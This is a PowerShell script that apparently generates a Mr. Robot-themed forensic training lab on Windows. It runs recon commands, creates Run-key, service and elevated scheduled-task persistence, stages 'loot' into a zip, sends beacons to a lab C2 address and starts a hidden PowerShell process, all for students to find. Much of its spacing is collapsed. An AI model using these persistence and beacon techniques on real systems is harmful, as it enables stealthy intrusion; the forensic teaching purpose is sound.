# Attack Emulation - Mr. Robot Windows Forensic Artifact Generator
# Safe classroom emulation only

param(
    [string]$BasePath="$env:PUBLIC\Documents\fsociety",
    [string]$C2Host="10.0.3.2",
    [int]$C2Port=8080
)

$ErrorActionPreference="SilentlyContinue"

$RunKeyName="fsociety_update"
$ServiceName="EvilCorpUpdater"
$TaskName="fsociety_stage2_task"
$PayloadName="MR_ROBOT.exe"
$PayloadPath="$BasePath\$PayloadName"
$LogPath="$BasePath\loot\recon_results.txt"
$BrowserPath="$BasePath\web\evilcorp_login.html"
$StagingZip="$BasePath\loot\fsociety_exfil_staging.zip"

Write-Host"[+] Creating Mr. Robot forensic artifact lab at$BasePath"

New-Item-ItemTypeDirectory-Force-Path$BasePath|Out-Null
New-Item-ItemTypeDirectory-Force-Path"$BasePath\loot"|Out-Null
New-Item-ItemTypeDirectory-Force-Path"$BasePath\shellbags\E-Corp\Finance\Payroll"|Out-Null
New-Item-ItemTypeDirectory-Force-Path"$BasePath\web"|Out-Null
New-Item-ItemTypeDirectory-Force-Path"$BasePath\deleted_files"|Out-Null

# ------------------------------------------------------------
# 1. Initial execution artifact: Prefetch, BAM, Shimcache, MFT
# ------------------------------------------------------------

Write-Host"[+] Creating renamed executable artifact:$PayloadName"

Copy-Item"$env:WINDIR\System32\notepad.exe"$PayloadPath-Force
Start-Process$PayloadPath
Start-Sleep-Seconds3

# ------------------------------------------------------------
# 2. Reconnaissance commands: process execution + command history
# ------------------------------------------------------------

Write-Host"[+] Running attacker-style reconnaissance commands"

"=== fsociety Recon Results ==="|Out-File$LogPath
"Timestamp:$(Get-Date)"|Out-File$LogPath-Append
whoami/all|Out-File$LogPath-Append
hostname|Out-File$LogPath-Append
ipconfig/all|Out-File$LogPath-Append
systeminfo|Out-File$LogPath-Append
netuser|Out-File$LogPath-Append
netlocalgroupadministrators|Out-File$LogPath-Append
tasklist|Out-File$LogPath-Append

# ------------------------------------------------------------
# 3. Registry Run Key persistence
# ------------------------------------------------------------

Write-Host"[+] Creating Windows Registry Run Key persistence"

New-ItemProperty `
-Path"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name$RunKeyName `
-Value"`"$PayloadPath`"" `
-PropertyTypeString `
-Force|Out-Null

# ------------------------------------------------------------
# 4. Windows Service persistence
# ------------------------------------------------------------

Write-Host"[+] Creating Windows Service persistence"

sc.execreate$ServiceNamebinPath="cmd.exe /c echo fsociety service executed >>$BasePath\service_execution.txt"start=demandDisplayName="Evil Corp Update Service"|Out-Null
sc.exedescription$ServiceName"Mr. Robot themed forensic training service"|Out-Null

# ------------------------------------------------------------
# 5. Scheduled Task persistence
# ------------------------------------------------------------

Write-Host"[+] Creating Scheduled Task persistence"

schtasks.exe/Create `
/TN$TaskName `
/TR"`"$PayloadPath`"" `
/SCONLOGON `
/RLHIGHEST `
/F|Out-Null

# ------------------------------------------------------------
# 6. UserAssist artifact generation
#    Launch GUI apps and files through Explorer
# ------------------------------------------------------------

Write-Host"[+] Generating UserAssist artifacts"

Start-Processexplorer.exe$BasePath
Start-Sleep-Seconds2
Start-Processcalc.exe
Start-Sleep-Seconds2
Start-Processmspaint.exe
Start-Sleep-Seconds2

# ------------------------------------------------------------
# 7. ShellBags artifact generation
#    Browse nested folders with Explorer
# ------------------------------------------------------------

Write-Host"[+] Generating ShellBags artifacts"

Start-Processexplorer.exe"$BasePath\shellbags\E-Corp"
Start-Sleep-Seconds2
Start-Processexplorer.exe"$BasePath\shellbags\E-Corp\Finance"
Start-Sleep-Seconds2
Start-Processexplorer.exe"$BasePath\shellbags\E-Corp\Finance\Payroll"
Start-Sleep-Seconds2

# ------------------------------------------------------------
# 8. File creation, modification, deletion: $MFT and $J
# ------------------------------------------------------------

Write-Host"[+] Creating file system artifacts: MFT and USN Journal"

1..10|ForEach-Object {
$file="$BasePath\deleted_files\evilcorp_secret_$_.txt"
"fsociety was here - file$_"|Out-File$file
Add-Content$file"Modified at$(Get-Date)"
Remove-Item$file-Force
}

"Stage file 1 - employee list"|Out-File"$BasePath\loot\evilcorp_employees.txt"
"Stage file 2 - financial records"|Out-File"$BasePath\loot\evilcorp_finance.txt"
"Stage file 3 - recovery key notes"|Out-File"$BasePath\loot\evilcorp_recovery_notes.txt"

# ------------------------------------------------------------
# 9. Browser artifacts / Browser forensics
# ------------------------------------------------------------

Write-Host"[+] Creating browser artifacts"

@"
<html>
<head><title>Evil Corp Login Portal</title></head>
<body>
<h1>Evil Corp Internal Login</h1>
<p>fsociety training artifact</p>
</body>
</html>
"@|Out-File$BrowserPath

Start-Process$BrowserPath
Start-Sleep-Seconds2

Start-Process"https://example.com/fsociety"
Start-Sleep-Seconds2
Start-Process"https://example.com/evilcorp/payroll"
Start-Sleep-Seconds2

# ------------------------------------------------------------
# 10. Simulated C2 traffic
#     Safe beacon attempts to lab IP
# ------------------------------------------------------------

Write-Host"[+] Generating simulated C2 traffic"

1..5|ForEach-Object {
try {
Invoke-WebRequest `
-Uri"http://$C2Host`:$C2Port/beacon?id=elliot&host=$env:COMPUTERNAME&seq=$_" `
-UseBasicParsing `
-TimeoutSec2|Out-Null
    }catch {}

Test-NetConnection$C2Host-Port$C2Port|Out-File"$BasePath\loot\c2_test_$_.txt"
Start-Sleep-Seconds3
}

# ------------------------------------------------------------
# 11. Staging files for fake exfiltration
# ------------------------------------------------------------

Write-Host"[+] Staging files into ZIP archive"

Compress-Archive `
-Path"$BasePath\loot\*" `
-DestinationPath$StagingZip `
-Force

# ------------------------------------------------------------
# 12. Memory artifacts
#     Leaves a named PowerShell process running for memory capture
# ------------------------------------------------------------

Write-Host"[+] Creating memory-resident artifact"

$MemoryCommand=@"
`$fsociety_marker = 'MR_ROBOT_MEMORY_ARTIFACT';
`$c2 = 'http://$C2Host`:$C2Port/beacon';
`$operator = 'elliot';
`$target = 'evilcorp';
Start-Sleep -Seconds 3600
"@

Start-Processpowershell.exe `
-ArgumentList"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command$MemoryCommand"

Write-Host""
Write-Host"[+] Artifact generation complete."
Write-Host"[+] Suggested student collection tools:"
Write-Host"    KAPE, Eric Zimmerman Tools, RegRipper, PECmd, AppCompatCacheParser,"
Write-Host"    ShellBags Explorer, DB Browser for SQLite, Volatility, MFTECmd, EvtxECmd"
Write-Host""
Write-Host"[+] Base artifact path:$BasePath"